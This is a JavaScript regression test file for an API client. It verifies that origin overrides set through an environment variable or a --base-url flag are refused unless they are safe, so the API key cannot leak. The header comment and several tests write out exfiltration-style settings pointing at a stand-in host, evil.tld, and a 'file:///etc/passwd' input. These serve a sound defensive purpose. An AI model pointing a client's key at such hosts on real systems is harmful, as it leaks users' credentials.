/**
 * `richapi_API_ORIGIN` used to send the live API key to any host, over any scheme.
 *
 * The old code was two lines:
 *
 *   baseUrl = process.env.richapi_API_ORIGIN ? `${...}/api/v1` : DEFAULT_BASE_URL,
 *   headers: { 'content-type': 'application/json', 'x-api-key': this.apiKey },
 *
 * No allowlist, no scheme check, no warning. `richapi_API_ORIGIN=http://evil.tld`
 * posted the key in a plaintext header on the next call, and
 * `richapi-capture-fixtures --run --yes --base-url https://evil.tld` did it once per
 * endpoint in the spec.
 *
 * Every test below is written to FAIL if that behaviour comes back. The two that
 * matter most are the pair at the top: the refusal must be a THROW, and the client
 * must NOT quietly fall back to the default — a user who thinks their override is in
 * force while the key goes to api.richapi.ai has been lied to, which is its own bug.
 */

import assert from 'node:assert/strict';
import test from 'node:test';
import { execFileSync } from 'node:child_process';
import { join, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import {
  RichApiClient, UnsafeOrigin, assertSafeOrigin, resolveBaseUrl,
  DEFAULT_BASE_URL, DEFAULT_ORIGIN, ORIGIN_ENV, ORIGIN_OPT_IN_ENV,
} from '../../_lib/client.mjs';
import { makeGtmTree } from '../helpers/tmp-tree.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const CAPTURE = join(ROOT, 'bin', 'richapi-capture-fixtures.mjs');

/** A fetch that cannot succeed. If the transport is reached at all, the test dies. */
const NEVER = () => { throw new Error('THE API KEY WAS PUT ON THE WIRE'); };

/** `assert.throws` does not hand back the error; these tests read the message. */
function caught (fn, why = 'expected a throw, got none') {
  try { fn(); } catch (err) { return err; }
  return assert.fail(why);
}

// ---------------------------------------------------------------------------
// the refusal, and the absence of a silent fallback
// ---------------------------------------------------------------------------

test('an http: origin is REFUSED, and the key never reaches the transport', () => {
  const env = { richapi_API_KEY: 'live-key-do-not-leak', [ORIGIN_ENV]: 'http://evil.tld' };

  assert.throws(
    () => new RichApiClient({ fetchImpl: NEVER, env }),
    (err) => {
      assert.ok(err instanceof UnsafeOrigin, `expected UnsafeOrigin, got ${err?.name}`);
      // Loud: it names what was refused and why.
      assert.match(err.message, /REFUSED/);
      assert.match(err.message, /http:\/\/evil\.tld/);
      assert.match(err.message, /https:/);
      // And it must not have leaked the key into its own error text.
      assert.ok(!err.message.includes('live-key-do-not-leak'), 'the refusal echoed the API key');
      return true;
    },
  );
});

test('the refusal says outright that nothing fell back to the default', () => {
  // A silent fallback would be its own bug: the user believes they are hitting their
  // override while the key goes to api.richapi.ai. The message has to close that door.
  for (const origin of ['http://evil.tld', 'https://evil.tld']) {
    const env = { richapi_API_KEY: 'k', [ORIGIN_ENV]: origin };
    const err = caught(() => new RichApiClient({ fetchImpl: NEVER, env }), `${origin} was accepted`);
    assert.match(err.message, /NO fallback/i, `${origin}: the refusal did not disclaim a fallback`);
    assert.match(err.message, new RegExp(DEFAULT_ORIGIN.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
  }
});

test('a refused override throws instead of resolving to the default base URL', () => {
  // The regression this guards: `catch { baseUrl = DEFAULT_BASE_URL }` anywhere in the
  // resolve path. If resolveBaseUrl ever RETURNS for a hostile origin, it must not be
  // the default, and it must not be the hostile origin either — so: it must throw.
  const env = { [ORIGIN_ENV]: 'http://evil.tld' };
  let returned;
  try {
    returned = resolveBaseUrl({ env });
  } catch (err) {
    assert.ok(err instanceof UnsafeOrigin);
    return;
  }
  assert.fail(`resolveBaseUrl silently returned ${JSON.stringify(returned)} for a refused origin`);
});

test('a remote https: origin needs an explicit opt-in, and the refusal says how', () => {
  const env = { richapi_API_KEY: 'k', [ORIGIN_ENV]: 'https://evil.tld' };
  const err = caught(() => new RichApiClient({ fetchImpl: NEVER, env }));
  assert.ok(err instanceof UnsafeOrigin);
  assert.match(err.message, /REFUSED/);
  assert.match(err.message, new RegExp(ORIGIN_OPT_IN_ENV));
  assert.match(err.message, /evil\.tld/, 'the refusal must name the host to pin');
});

test('http: to a REMOTE host has no opt-in at all; the flag does not unlock it', () => {
  for (const optIn of ['1', 'true', 'yes', 'evil.tld']) {
    const env = { richapi_API_KEY: 'k', [ORIGIN_ENV]: 'http://evil.tld', [ORIGIN_OPT_IN_ENV]: optIn };
    const err = caught(
      () => new RichApiClient({ fetchImpl: NEVER, env }),
      `${ORIGIN_OPT_IN_ENV}=${optIn} unlocked plaintext to a remote host`,
    );
    assert.ok(err instanceof UnsafeOrigin);
    assert.match(err.message, /plaintext/);
  }
});

test('an opt-in pinned to another host does not open this one', () => {
  const env = {
    richapi_API_KEY: 'k',
    [ORIGIN_ENV]: 'https://evil.tld',
    [ORIGIN_OPT_IN_ENV]: 'my-proxy.internal',
  };
  assert.throws(() => new RichApiClient({ fetchImpl: NEVER, env }), UnsafeOrigin);
});

test('credentials embedded in the origin are refused, and never echoed back', () => {
  const env = { richapi_API_KEY: 'k', [ORIGIN_ENV]: 'https://user:hunter2@api.richapi.ai' };
  const err = caught(() => new RichApiClient({ fetchImpl: NEVER, env }));
  assert.ok(err instanceof UnsafeOrigin);
  assert.ok(!err.message.includes('hunter2'), 'the refusal echoed the embedded password');
});

test('a non-http(s) scheme is refused before anything is parsed as an origin', () => {
  for (const bad of ['file:///etc/passwd', 'ftp://evil.tld', 'not a url at all', '']) {
    const env = { richapi_API_KEY: 'k', [ORIGIN_ENV]: bad };
    if (bad === '') {
      // Empty is "unset", exactly as before the fix — it must still reach the default.
      assert.equal(new RichApiClient({ fetchImpl: NEVER, env }).baseUrl, DEFAULT_BASE_URL);
      continue;
    }
    assert.throws(() => new RichApiClient({ fetchImpl: NEVER, env }), UnsafeOrigin, `accepted ${bad}`);
  }
});

// ---------------------------------------------------------------------------
// what still works — the fix must not lock out legitimate users
// ---------------------------------------------------------------------------

test('the default origin needs no opt-in and is unchanged', () => {
  const c = new RichApiClient({ apiKey: 'k', fetchImpl: NEVER, env: {} });
  assert.equal(c.baseUrl, DEFAULT_BASE_URL);
  assert.equal(c.baseUrlSource, 'default');
});

test('a self-hosted https origin opts in by hostname, or by 1/true/yes', () => {
  for (const optIn of ['api.selfhosted.example', 'API.SELFHOSTED.EXAMPLE', '1', 'true', 'yes']) {
    const c = new RichApiClient({
      fetchImpl: NEVER,
      env: {
        richapi_API_KEY: 'k',
        [ORIGIN_ENV]: 'https://api.selfhosted.example',
        [ORIGIN_OPT_IN_ENV]: optIn,
      },
    });
    assert.equal(c.baseUrl, 'https://api.selfhosted.example/api/v1', `opt-in ${optIn} was not honoured`);
    assert.equal(c.baseUrlSource, ORIGIN_ENV);
  }
});

test('loopback is allowed over http: with no opt-in (the key never leaves the box)', () => {
  // This is not a convenience carve-out: every local mock server in this suite and the
  // setup sweep's own wedge tests point richapi_API_ORIGIN at 127.0.0.1. It is the same
  // secure-context exemption browsers make, for the same reason.
  const hosts = [
    'http://127.0.0.1:8080', 'http://localhost:3000', 'http://[::1]:9000',
    'http://127.9.9.9', 'https://localhost:8443',
  ];
  for (const origin of hosts) {
    const c = new RichApiClient({ fetchImpl: NEVER, env: { richapi_API_KEY: 'k', [ORIGIN_ENV]: origin } });
    assert.equal(c.baseUrl, `${origin}/api/v1`, `loopback origin ${origin} was refused`);
  }
});

test('an explicitly passed baseUrl goes through the same check', () => {
  // `new RichApiClient({ baseUrl })` bypassed the env var entirely, so a check that
  // only looked at richapi_API_ORIGIN would leave the whole hole open.
  assert.throws(
    () => new RichApiClient({ apiKey: 'k', baseUrl: 'http://evil.tld/api/v1', fetchImpl: NEVER, env: {} }),
    UnsafeOrigin,
  );
  const ok = new RichApiClient({ apiKey: 'k', baseUrl: 'http://127.0.0.1:5555/api/v1', fetchImpl: NEVER, env: {} });
  assert.equal(ok.baseUrl, 'http://127.0.0.1:5555/api/v1');
});

test('assertSafeOrigin names the source that set the origin', () => {
  const err = caught(() => assertSafeOrigin('http://evil.tld', { env: {}, source: '--base-url' }));
  assert.match(err.message, /--base-url/);
});

// ---------------------------------------------------------------------------
// bin/richapi-capture-fixtures.mjs — the same hole, once per endpoint in the spec
// ---------------------------------------------------------------------------

function runCapture (args, env = {}) {
  // A preload that makes any network call fatal. `--run --yes --base-url https://evil.tld`
  // used to walk the whole spec posting the key; if a single call escapes, this dies.
  const tree = makeGtmTree();
  const guard = tree.write('no-network.mjs',
    "globalThis.fetch = () => { throw new Error('NETWORK CALL ATTEMPTED'); };\n");
  try {
    const stdout = execFileSync(
      process.execPath, ['--import', pathToFileURL(guard).href, CAPTURE, ...args],
      {
        cwd: ROOT,
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
        env: {
          ...process.env,
          richapi_API_KEY: '',
          RICHAPI_API_KEY: '',
          [ORIGIN_ENV]: '',
          [ORIGIN_OPT_IN_ENV]: '',
          ...env,
        },
      },
    );
    return { code: 0, stdout, stderr: '' };
  } catch (e) {
    return { code: e.status, stdout: e.stdout ?? '', stderr: e.stderr ?? '' };
  }
}

test('capture-fixtures refuses --base-url to a stranger, before any call', () => {
  const r = runCapture(
    ['--only', 'email_finder', '--run', '--yes', '--base-url', 'https://evil.tld'],
    { richapi_API_KEY: 'live-key-do-not-leak' },
  );
  assert.notEqual(r.code, 0, 'the capture ran with a hostile --base-url');
  assert.match(r.stderr, /REFUSED/);
  assert.match(r.stderr, /evil\.tld/);
  assert.match(r.stderr, new RegExp(ORIGIN_OPT_IN_ENV));
  assert.ok(!r.stderr.includes('live-key-do-not-leak'), 'the refusal echoed the API key');
  assert.ok(!/NETWORK CALL ATTEMPTED/.test(r.stderr), 'it reached the network anyway');
  assert.ok(!/Capturing|CAPTURED|OK  /.test(r.stdout), 'it started capturing');
});

test('capture-fixtures refuses an http: --base-url even in plan mode', () => {
  // Plan mode spends nothing, but an origin the key must not go to is a broken
  // configuration either way, and refusing at parse time means no path can escape it.
  const r = runCapture(['--only', 'email_finder', '--base-url', 'http://evil.tld/api/v1']);
  assert.notEqual(r.code, 0);
  assert.match(r.stderr, /REFUSED/);
  assert.match(r.stderr, /plaintext/);
});

test('capture-fixtures still plans normally against the default origin', () => {
  const r = runCapture(['--only', 'email_finder']);
  assert.equal(r.code, 0, r.stderr);
  assert.match(r.stdout, /PLAN ONLY/);
});

test('capture-fixtures treats richapi_API_ORIGIN as an ORIGIN, not a base URL', () => {
  // Before the fix the env var was used bare, so a self-hosted user POSTed to
  // https://host/email_finder with /api/v1 dropped on the floor.
  const r = runCapture(['--only', 'email_finder'], {
    [ORIGIN_ENV]: 'https://api.selfhosted.example',
    [ORIGIN_OPT_IN_ENV]: 'api.selfhosted.example',
  });
  assert.equal(r.code, 0, r.stderr);
  assert.match(r.stdout, /PLAN ONLY/);

  const r2 = runCapture(['--only', 'email_finder'], { [ORIGIN_ENV]: 'https://api.selfhosted.example' });
  assert.notEqual(r2.code, 0, 'a self-hosted origin was accepted with no opt-in');
  assert.match(r2.stderr, /REFUSED/);
});
